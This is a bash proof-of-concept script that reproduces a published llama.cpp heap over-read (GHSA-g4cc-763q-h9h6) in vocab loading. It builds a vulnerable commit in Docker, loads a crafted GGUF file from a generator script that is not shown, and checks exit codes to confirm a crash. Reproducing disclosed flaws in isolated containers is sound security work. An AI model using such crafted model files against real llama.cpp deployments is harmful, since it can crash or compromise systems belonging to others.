#!/bin/bash
# GHSA-g4cc-763q-h9h6: llama.cpp Heap Over-Read in Vocab Loading
# Reference: https://github.com/ggml-org/llama.cpp/security/advisories/GHSA-g4cc-763q-h9h6

set -e

echo "=== GHSA-g4cc-763q-h9h6 PoC Environment ==="
echo ""

echo "[1] Creating malicious GGUF file (tiny vocab triggers heap over-read)..."
mkdir -p poc
python3 create_malicious_gguf.py poc/malicious.gguf

echo ""
echo "[2] Building vulnerable llama.cpp (commit c33fe8b7, parent of fix c33fe8b8)..."
docker compose build

echo ""
echo "[3] Starting container..."
docker compose up -d

echo ""
echo "[4] Waiting for container to be ready..."
sleep 3

echo ""
echo "[5] Triggering vulnerability (loading GGUF with tiny vocab)..."
echo "    Running: llama-cli -m /poc/malicious.gguf -p test -n 1"
echo "    The BOS token id (1) exceeds the vocab size (1), causing an out-of-bounds read."
echo ""
docker exec llamacpp-ghsa-g4cc llama-cli -m /poc/malicious.gguf -p "test" -n 1 2>&1 || true
sleep 1

echo ""
echo "[6] Verifying crash..."
EXIT_CODE=$(docker inspect llamacpp-ghsa-g4cc --format='{{.State.ExitCode}}' 2>/dev/null || echo "unknown")
RUNNING=$(docker inspect llamacpp-ghsa-g4cc --format='{{.State.Running}}' 2>/dev/null || echo "unknown")

echo "  Container running: $RUNNING"
echo "  Last exit code: $EXIT_CODE"

echo ""
echo "  Container logs (last 15 lines):"
docker logs llamacpp-ghsa-g4cc 2>&1 | tail -15 | sed 's/^/      /'

echo ""
if echo "$EXIT_CODE" | grep -qE "^(139|137|134|136)$"; then
    echo "  [*] Process crashed with signal (exit code $EXIT_CODE) - heap over-read confirmed"
elif docker exec llamacpp-ghsa-g4cc sh -c 'true' 2>/dev/null; then
    # Container is still running (sleep infinity), check the exec exit code
    EXEC_EXIT=$(docker exec llamacpp-ghsa-g4cc sh -c 'llama-cli -m /poc/malicious.gguf -p test -n 1 2>&1; echo "EXIT:$?"' 2>&1 | grep 'EXIT:' | cut -d: -f2)
    if echo "$EXEC_EXIT" | grep -qE "^(139|137|134|136)$"; then
        echo "  [*] llama-cli crashed with signal (exit code $EXEC_EXIT) - heap over-read confirmed"
    else
        echo "  [*] llama-cli exited with code $EXEC_EXIT. Check logs above for segfault / error details."
    fi
else
    echo "  [*] Process exited (code $EXIT_CODE). Check logs above for segfault / signal details."
fi

echo ""
echo "=== Done ==="
echo "To stop: docker compose down"
echo ""
